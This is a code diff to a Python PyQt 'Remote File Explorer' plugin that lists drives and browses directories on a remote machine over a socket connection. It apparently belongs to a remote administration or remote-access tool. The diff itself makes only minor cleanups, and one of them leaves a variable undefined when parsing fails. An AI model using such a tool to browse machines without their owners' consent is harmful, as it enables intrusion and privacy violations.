@@ -18,8 +18,7 @@ class mainPopup(QWidget, Ui_Form):
         self.sock = args['sock']
         self.socket = args['socket']
         self.ipAddress = args['ipAddress']
-        self.icon = args['icon']
-        self.path = args['path']
+        self.path = os.path.join(os.getcwd(), 'plugins\\mexplorer')
 
         self.gui = QApplication.processEvents
 
@@ -36,7 +35,6 @@ class mainPopup(QWidget, Ui_Form):
         self.folderIcon = os.path.join(self.path, 'assets', 'folder.png')
 
         self.setWindowTitle('Remote File Explorer on - %s - Socket #%s' % (self.ipAddress, self.socket))
-        self.setWindowIcon(QIcon(self.icon))
 
         self.Kernel32 = ctypes.windll.kernel32
 
@@ -300,7 +298,6 @@ class mainPopup(QWidget, Ui_Form):
         self.comboInEditMode = True
         self.lexplorerDrivesDrop.clear()
         drives = self.Exec('wmic logicaldisk get caption')
-        print drives
         for i in drives.split('Caption')[-1].split('\n'):
             if ':' in i:
                 self.lexplorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))
@@ -359,7 +356,6 @@ class mainPopup(QWidget, Ui_Form):
     def ldriveChange(self):
         if not self.comboInEditMode:
             drive = str(self.lexplorerDrivesDrop.itemText(self.lexplorerDrivesDrop.currentIndex()))
-            print drive
             os.chdir(drive)
             self.getLocalContent()
 
@@ -491,15 +487,13 @@ class mainPopup(QWidget, Ui_Form):
         self.rexplorerTable.clearContents()
         self.rexplorerTable.sortItems(0)
 
-        while 1:
-            try:
-                self.data = get(self.sock, 'ls', 'explorerContent')
+        try:
+            self.data = get(self.sock, 'ls', 'explorerContent')
 
-                # set remote path entry
-                content = ast.literal_eval(self.data)
-            except (SyntaxError, ValueError):
-                continue
-            break
+            # set remote path entry
+            content = ast.literal_eval(self.data)
+        except (SyntaxError, ValueError):
+            pass
 
 
         self.rexplorerPathEntry.setText(content['path'])
